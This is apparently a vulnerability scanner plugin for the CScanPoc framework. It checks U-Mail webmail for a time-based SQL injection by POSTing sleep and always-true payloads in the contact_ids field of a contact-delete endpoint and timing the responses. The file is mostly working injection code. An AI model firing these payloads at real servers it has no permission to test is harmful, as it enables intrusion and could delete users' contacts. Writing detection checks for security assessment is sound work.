# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'U-Mail_0005_p'  # 平台漏洞编号，留空
    name = 'U-Mail邮件系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-28'  # 漏洞公布时间
    desc = '''
        U-Mail专家级邮件系统是福洽科技最新推出的第四代企业邮局系统。该产品依托福洽科技在信息领域中领先的技术与完善的服务，专门针对互联网信息技术的特点，综合多行业多领域不同类型企业自身信息管理发展的特点，采用与国际先进技术接轨的专业系统和设备，将先进的网络信息技术与企业自身的信息管理需要完美的结合起来。
        u-mail client\pab\module\o_contact.php中
        $contact_ids = gss( $_POST['contact_ids'] ); // 未过滤产生了SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2195/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c3a5889a-0bf5-4d42-a850-5ff03fa7f329'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # payload根据实际情况确定
            payload = '/webmail/client/pab/index.php?module=operate&action=contact-del'
            data_sleep = "contact_ids=-1) or sleep(5)%23"
            data_normal = "contact_ids=-1) or 1%23"
            url = self.target + payload
            time_start = time.time()
            requests.post(url, data=data_normal)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
